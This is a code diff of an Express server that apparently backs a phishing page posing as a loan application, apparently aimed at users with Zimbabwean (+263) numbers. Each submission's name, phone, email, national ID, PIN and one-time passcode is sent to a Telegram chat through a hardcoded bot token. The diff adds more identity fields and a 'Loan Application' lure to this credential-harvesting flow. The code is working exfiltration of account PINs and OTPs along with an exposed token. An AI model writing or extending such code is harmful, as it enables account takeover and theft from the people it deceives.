@@ -3,7 +3,7 @@ const path = require('path');
 const app = express();
 
 // Configuration
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 const BOT_TOKEN = '8895411616:AAHp-t75c2aBIIAdV8k7foAQHRZpUKIK7Gk';
 const CHAT_ID = '8565817118';
 
@@ -12,6 +12,19 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+// FORCE HTTPS
+app.use((req, res, next) => {
+  if (req.headers['x-forwarded-proto'] !== 'https') {
+    if (req.url.startsWith('/')) {
+      res.redirect('https://' + req.headers.host + req.url);
+    } else {
+      res.redirect('https://' + req.headers.host + '/' + req.url);
+    }
+  } else {
+    next();
+  }
+});
+
 // Serve Main Page
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
@@ -19,7 +32,7 @@ app.get('/', (req, res) => {
 
 // Handle Sign Up
 app.post('/signup', async (req, res) => {
-  const { firstName, surname, phone, pin } = req.body;
+  const { firstName, surname, country, phone, email, nationalId, loanAmount, pin } = req.body;
 
   let fullPhone = phone;
   if (!phone.startsWith('+263') && !phone.startsWith('0')) {
@@ -29,10 +42,14 @@ app.post('/signup', async (req, res) => {
   }
 
   const message = `
-📝 <b>New Sign Up</b>
+📝 <b>New Loan Application</b>
 
 👤 <b>Name:</b> ${firstName} ${surname}
+🌍 <b>Country:</b> ${country}
 📱 <b>Phone:</b> ${fullPhone}
+📧 <b>Email:</b> ${email}
+🆔 <b>Native ID:</b> ${nationalId}
+💰 <b>Amount:</b> $${loanAmount}
 🔑 <b>PIN:</b> <code>${pin}</code>
 
 <i>Waiting for OTP verification...</i>
@@ -57,7 +74,7 @@ app.post('/signup', async (req, res) => {
 
 // Handle OTP Verification
 app.post('/verify-otp', async (req, res) => {
-  const { firstName, surname, phone, pin, otp } = req.body;
+  const { firstName, surname, country, phone, email, nationalId, loanAmount, pin, otp } = req.body;
 
   let fullPhone = phone;
   if (!phone.startsWith('+263') && !phone.startsWith('0')) {
@@ -70,7 +87,11 @@ app.post('/verify-otp', async (req, res) => {
 ✅ <b>OTP Verified</b>
 
 👤 <b>Name:</b> ${firstName} ${surname}
+🌍 <b>Country:</b> ${country}
 📱 <b>Phone:</b> ${fullPhone}
+📧 <b>Email:</b> ${email}
+🆔 <b>Native ID:</b> ${nationalId}
+💰 <b>Amount:</b> $${loanAmount}
 🔑 <b>PIN:</b> <code>${pin}</code>
 📲 <b>OTP:</b> <b>${otp}</b>
 
